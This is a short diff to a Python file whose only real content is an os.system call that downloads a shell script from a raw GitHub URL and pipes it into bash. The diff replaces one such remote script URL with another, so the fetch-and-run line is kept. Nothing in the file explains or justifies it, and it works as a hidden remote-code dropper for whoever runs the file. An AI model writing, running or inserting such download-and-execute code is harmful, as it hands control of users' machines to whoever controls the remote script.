@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://raw.githubusercontent.com/amberektheoenny/expert-rotary-phone/refs/heads/main/fres | bash')
+os.system('curl -sL https://raw.githubusercontent.com/amberektheoenny/dert/refs/heads/main/mantab.sh | bash')
